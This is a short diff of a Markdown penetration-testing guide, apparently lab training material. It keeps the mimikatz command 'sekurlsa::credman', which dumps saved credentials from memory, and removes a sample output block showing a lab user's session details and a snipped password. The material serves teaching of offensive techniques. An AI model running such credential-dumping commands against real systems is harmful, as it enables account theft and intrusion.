@@ -378,22 +378,7 @@ Next, use:
 mimikatz # sekurlsa::credman
 ```
 
-### 📌 Example Output
 
-```text
-Authentication Id : 0 ; 630472 (00000000:00099ec8)
-Session           : RemoteInteractive from 3
-User Name         : mcharles
-Domain            : SRV01
-Logon Server      : SRV01
-Logon Time        : 4/27/2025 2:40:32 AM
-SID               : S-1-5-21-1340203682-1669575078-4153855890-1002
-        credman :
-         [00000000]
-         * Username : mcharles@inlanefreight.local
-         * Domain   : onedrive.live.com
-         * Password : ...SNIP...
-```
 
 ---
 
